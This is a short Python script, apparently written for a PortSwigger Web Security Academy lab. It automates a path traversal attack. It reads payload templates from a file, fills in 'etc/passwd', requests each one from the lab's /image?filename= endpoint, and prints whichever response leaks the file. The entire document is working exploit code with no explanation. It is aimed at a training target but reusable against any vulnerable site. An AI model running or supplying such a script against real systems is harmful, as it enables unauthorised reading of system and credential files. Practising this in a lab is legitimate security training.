#!/usr/bin/python3

import requests

def dt_image(url, api):

    payload = "etc/passwd"

    for i in open("dt_payload.txt", "r"):
        i = i.rstrip('\n')
        i = i.replace("{FILE}", payload)

        print(i)    

        r = requests.get(url + api + i)
        if "Not Found" in r.text:
            pass
        elif "No such file" in r.text:
            pass
        else:
            print("[INFO] Found something")
            print(r.text)
            break
    
if __name__ == '__main__':
    url = "https://acfc1f2f1fd7f603c07c0cde00fd0009.web-security-academy.net"
    api = "/image?filename="

    dt_image(url, api)